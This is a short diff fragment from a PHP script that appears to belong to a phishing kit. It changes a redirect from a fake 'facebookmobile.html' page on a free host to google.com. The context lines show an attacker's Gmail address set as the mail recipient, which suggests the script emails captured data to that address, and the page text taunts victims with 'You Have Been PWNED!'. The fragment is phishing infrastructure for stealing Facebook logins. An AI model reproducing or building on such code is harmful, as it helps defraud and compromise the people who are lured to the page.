@@ -6,10 +6,10 @@ $searchString = "<html><title>Your Connection To This Website is Secure</title>
 <text>You Have Been PWNED!</text>
 </html>";
 if($myFile == $searchString) {
-    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
+    header('Location: https://www.google.com');
 }
 if($myFile != $searchString) {
-    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
+    header('Location: https://www.google.com');
 }
 $headers = "From:amugawaya@gmail.com";
 $to = "darkmember2000@gmail.com";
